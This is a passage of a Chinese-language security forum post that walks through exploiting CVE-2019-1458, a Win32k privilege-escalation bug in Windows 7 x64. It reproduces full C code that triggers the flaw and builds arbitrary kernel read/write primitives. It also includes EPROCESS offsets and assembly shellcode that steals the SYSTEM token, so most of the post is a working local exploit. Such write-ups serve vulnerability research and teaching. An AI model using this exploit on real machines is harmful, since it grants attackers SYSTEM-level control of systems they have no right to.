
```
BOOL Trigger_CVE_2019_1458(HWND *hWndList)

{

	BOOL bRet = TRUE;

	HINSTANCE handle = NULL;

	lHMValidateHandle HMValidateHandle = NULL;



	handle = GetModuleHandle(NULL);

	if (!handle)

	{

		bRet = FALSE;

		ShowError("GetModuleHandle", GetLastError());

		goto exit;

	}



	HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();

	if (!HMValidateHandle)

	{

		bRet = FALSE;

		goto exit;

	}



	char *pBuf = "Trigger";

	WNDCLASSEX wc = { 0 };



	wc.cbSize = sizeof(wc);

	wc.cbWndExtra = 8;

	wc.hInstance = handle;

	wc.lpfnWndProc = DefWindowProc;

	wc.lpszClassName = pBuf;



	if (!RegisterClassEx(&wc))

	{

		bRet = FALSE;

		ShowError("RegisterClassEx", GetLastError());

		goto exit;

	}



	HWND hTriggerWnd = NULL;



	// 创建用来触发漏洞的窗口,指定窗口带有WS_VISIBLE

	hTriggerWnd = CreateWindowEx(0, pBuf, NULL, WS_VISIBLE, 0, 0, 0, 0,

								 NULL, NULL, handle, NULL);

	if (!hTriggerWnd)

	{

		bRet = FALSE;

		ShowError("CreateWindowEx", GetLastError());

		goto exit;

	}



	// 寻找用来攻击的窗口

	ULONG64 ulTriggerAddr = 0, ulAttackAddr = 0, i = 0;

	PTHRDESKHEAD pTriggerHead = (PTHRDESKHEAD)HMValidateHandle(hTriggerWnd, TYPE_WINDOW);

	

	ulTriggerAddr = (ULONG64)pTriggerHead->pSelf;

	HWND hAttackWnd = NULL;

	for (i = 0; i < 100; i++)

	{

		if (hWndList[i])

		{

			PTHRDESKHEAD pAttackHead = (PTHRDESKHEAD)HMValidateHandle(hWndList[i], TYPE_WINDOW);

			ulAttackAddr = (ULONG64)pAttackHead->pSelf;

			if (ulAttackAddr > ulTriggerAddr && ulAttackAddr - ulTriggerAddr < 0xFF0000)

			{

				hAttackWnd = hWndList[i];

				break;

			}

		}

	}



	if (!hAttackWnd)

	{

		printf("Do not find Attack tagWND\n");

		bRet = FALSE;

		goto exit;

	}

	

	// 设置tagWND->fnid为0x2A0

	NtUserMessageCall(hTriggerWnd, WM_CREATE, 0, 0, 0, 0, 0);



	// 设置内存地址

	ULONG64 ulValue = ulTriggerAddr + 0xE8 - 0x60;

	SetWindowLongPtrW(hTriggerWnd, 0, ulValue);



	// 设置[gpsi + 0x154] = 0x130

	if (!CreateWindowEx(0, "#32771", NULL, 0, 0, 0, 0, 0,

						NULL, NULL, handle, NULL))

	{

		bRet = FALSE;

		ShowError("CreateWindowEx", GetLastError());

		goto exit;

	}



	// 模拟Alt按键

	BYTE keyState[256];

	GetKeyboardState(keyState);

	keyState[VK_MENU] |= 0x80;

	SetKeyboardState(keyState);



	// 触发漏洞

	NtUserMessageCall(hTriggerWnd, WM_ERASEBKGND, 0, 0, 0, 0, 0);



	ULONG64 ulOffset = ulAttackAddr - ulTriggerAddr - 0x128;

	if (!EnablePrivilege_CVE_2019_1458(hTriggerWnd, hAttackWnd, ulOffset))

	{

		bRet = FALSE;

		goto exit;

	}



exit:

	return bRet;

}
```

在提权代码中，利用`tagWND->spwndParent`和`tagWND->StrName->Buffer`来实现任意代码读写，修改关键函数为ShellCode地址实现提权：

```
BOOL EnablePrivilege_CVE_2019_1458(HWND hTriggerWnd, HWND hAttackWnd, ULONG64 ulOffset)

{

	BOOL bRet = TRUE;



	PVOID pTargetAddr = NULL;



	pTargetAddr = GetHalQuerySystemInformation();

	if (!pTargetAddr)

	{

		bRet = FALSE;

		goto exit;

	}



	ULONG64 ulOrgFunAddr = 0;



	// 获取原函数地址

	ulOrgFunAddr = ReadData_CVE_2019_1458(hTriggerWnd, hAttackWnd, pTargetAddr, ulOffset);



	// 将函数修改为ShellCode地址

	WriteData_CVE_2019_1458(hTriggerWnd, hAttackWnd, pTargetAddr, ShellCodeInWin7, ulOffset);



	// 调用函数执行ShellCode实现提权

	if (!CallNtQueryIntervalProfile())

	{

		bRet = FALSE;

		goto exit;

	}

	

	// 恢复原函数

	WriteData_CVE_2019_1458(hTriggerWnd, hAttackWnd, pTargetAddr, (PVOID)ulOrgFunAddr, ulOffset);



exit:

	return bRet;

}



VOID WriteData_CVE_2019_1458(HWND hTriggerWnd, HWND hAttackWnd, PVOID pTargetAddr, PVOID pValue, ULONG64 ulOffset)

{

	BOOL bRet = TRUE;



	// 设置要写入的地址

	SetWindowLongPtrW(hTriggerWnd, ulOffset + 0xE0, (ULONG64)pTargetAddr);



	LARGE_UNICODE_STRING lstrData = { 0 };

	lstrData.Length = 0x8;

	lstrData.MaximumLength = 0xA;

	lstrData.Buffer = (PWCHAR)&pValue;

	NtUserDefSetText(hAttackWnd, &lstrData);

}



ULONG64 ReadData_CVE_2019_1458(HWND hTriggerWnd, HWND hAttackWnd, PVOID pTargetAddr, ULONG64 ulOffset)

{

	ULONG64 ulOrg = 0, ulOrgPar = 0;

	ULONG64 ulParOffset = ulOffset + 0x58;



	// 获取tagWND->spwndParent

	ulOrgPar = GetWindowLongPtrW(hTriggerWnd, ulParOffset);



	// 设置tagWND->spwndParent为目标地址

	SetWindowLongPtrW(hTriggerWnd, ulParOffset, (ULONG64)pTargetAddr);

	// 读取目标地址内容

	ulOrg = (ULONG64)GetAncestor(hAttackWnd, GA_PARENT);

	// 恢复tagWND->spwndParent

	SetWindowLongPtrW(hTriggerWnd, ulParOffset, ulOrgPar);



	return ulOrg;

}
```

# 五.运行结果

在Win7 x64系统中，用来实现提权的关键成员偏移如下：

```
3: kd> dt _EPROCESS

ntdll!_EPROCESS

   +0x180 UniqueProcessId  : Ptr64 Void

   +0x188 ActiveProcessLinks : _LIST_ENTRY

   +0x208 Token            : _EX_FAST_REF
```

此时的对象头定义如下，此时Body偏移为`0x30`，所以提权之后，增加PointerCount时的偏移为`-0x30`:

```
kd> dt _OBJECT_HEADER

nt!_OBJECT_HEADER

   +0x000 PointerCount     : Int8B

   +0x008 HandleCount      : Int8B

   +0x008 NextToFree       : Ptr64 Void

   +0x010 Lock             : _EX_PUSH_LOCK

   +0x018 TypeIndex        : UChar

   +0x019 TraceFlags       : UChar

   +0x01a InfoMask         : UChar

   +0x01b Flags            : UChar

   +0x020 ObjectCreateInfo : Ptr64 _OBJECT_CREATE_INFORMATION

   +0x020 QuotaBlockCharged : Ptr64 Void

   +0x028 SecurityDescriptor : Ptr64 Void

   +0x030 Body             : _QUAD
```

相应的ShellCode如下：

```
ShellCodeInWin7 proc

	push r8

	push r9

	; 从KPCR中获取当前线程_ETHREAD

	mov rax, gs:[188h]

	; 从_ETHREAD中获取当前进程_EPROCESS

	mov rax, [rax + 70h]	

	mov r8, rax

	

find_system_proc:

	; 获取下一进程EPROCESS地址

	mov rax, [rax + 188h]	

	sub rax, 188h

	; 获取PID

	mov rdx, [rax + 180h]	

	; 判断pid是否为4，不为4则跳转

	cmp rdx, 4			

	jne find_system_proc	



	; 将system的token赋值给本进程,并增加引用计数

	mov rax, [rax + 208h]	

	and al, 0f0h

	mov [r8 + 208h], rax

	mov r9, 2

	add [rax - 30h], r9

	

	; 设置返回值，退出函数

	mov rax, 1

	pop r9

	pop r8

	ret 

ShellCodeInWin7 endp
```

相应的代码在：[**2a9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3N6W2L8X3c8e0j5h3u0W2M7W2)9J5c8X3g2^5M7q4)9#2k6Y4R3$3y4q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2P5s2m8Q4y4h3k6^5y4U0c8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5&6i4K6u0V1x3e0b7#2z5q4)9J5k6h3y4H3M7l9`.`.**](https://bbs.kanxue.com/elink@e21K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3N6W2L8X3c8e0j5h3u0W2M7W2)9J5c8X3g2^5M7q4)9#2k6Y4R3$3y4q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2P5s2m8Q4y4h3k6^5y4U0c8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5&6i4K6u0V1x3e0b7#2z5q4)9J5k6h3y4H3M7l9`.`.)。编译运行成功，就可以成功提权：

![](https://bbs.kanxue.com/upload/attach/202206/835440_49QT3KEHCHXZSVT.jpg)

虽然可以成功提权，由于触发漏洞的时候，`xxxPaintSwitchWindow`会修改`0x10`字节的数据，所以不只是`tagWND->cbwndExtra`会被修改，其他成员也会被修改，所以在程序释放窗口的时候就会产生BSOD。尝试过把这些被修改的数据改成0，或者其他窗口的数值，但还是会蓝屏，不知道要怎么解决，就等论坛的其他师傅们探索了。

![](https://bbs.kanxue.com/upload/attach/202206/835440_2TWB68A2Y4WE64Q.jpg)

# 六.参考资料

- [**https://bbs.pediy.com/thread-260268.htm**](https://bbs.pediy.com/thread-260268.htm)

- [**f70K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4q4I4i4K6g2X3y4o6p5J5y4e0t1#2x3U0m8Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0p5J5x3o6x3H3z5o6M7J5z5b7`.`.**](https://bbs.kanxue.com/elink@99aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4q4I4i4K6g2X3y4o6p5J5y4e0t1#2x3U0m8Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0p5J5x3o6x3H3z5o6M7J5z5b7`.`.)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2022-7-19 18:14

被1900编辑

，原因：

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)
